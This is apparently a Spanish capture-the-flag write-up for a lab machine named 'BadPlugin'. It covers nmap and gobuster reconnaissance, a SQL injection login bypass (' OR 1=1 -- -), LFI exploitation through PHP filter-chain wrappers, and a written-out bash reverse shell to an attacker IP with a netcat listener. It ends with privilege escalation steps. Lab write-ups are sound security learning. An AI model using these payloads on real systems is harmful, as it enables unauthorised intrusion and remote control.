# Máquina BadPlugin

### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 192.168.42.135

![alt text](image-1.png)

### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p80 vvv -Pn 192.168.42.135

![alt text](image-2.png)



### Fuzzing Web

gobuster dir -t 200 -u http://192.168.42.135/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,sh,py,js,html,db,png,jpg,git -b 403,404 2>/dev/null

![alt text](image-3.png)

Fuzzing web a library

gobuster dir -t 200 -u http://192.168.42.135/library/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,sh,py,js,html,db,png,jpg,git -b 403,404 2>/dev/null

![alt text](image-4.png)

### Accedemos a /library/admin

Nos encontramos con un formulario de login que fácilmente podemos ingresar utilizando ' OR 1=1 -- -

![alt text](image-5.png)

Inicio de sesión exitoso:

![alt text](image-6.png)

### Explotación

inspeccionamos la página con ctrl + u y encontramos un LFI:

![alt text](image-7.png)

Usando wrappers con la herramienta php_filter_chain_generator 

pasos a seguir:

a.- Creamos una reverse shell llamada r con el siguiente contenido:

nano r

bash -i >& /dev/tcp/192.168.42.133/443 0>&1 

![alt text](image-8.png)

b.- Iniciamos un servidor web con python en la carpeta donde creamos el r

python3 -m http.server 80

![alt text](image-9.png)

c.- Nos ponemos en escucha con netcat por el puerto 443

nc -nlvp 443

d. En la carpeta php_filter_chain_generator, ejecutamos

![alt text](image-11.png)

generará un wrapper

e.- Pegamos el wrapper  en la url de esta manera:

ejemplo:

http://192.168.42.135/library/admin/index.php?lang=wrapper

f.- Tenemos acceso

![alt text](image-10.png)

### Escalar privilegios

En el directorio home hay 1 usuario

![alt text](image-12.png)


busqué en todos los archivos desde la raíz para ver encuentro alguna contraseña:

![alt text](image-13.png)

cambiamos al usuario r3dh4ck

![alt text](image-14.png)

sudo -l

![alt text](image-15.png)

![alt text](image-16.png)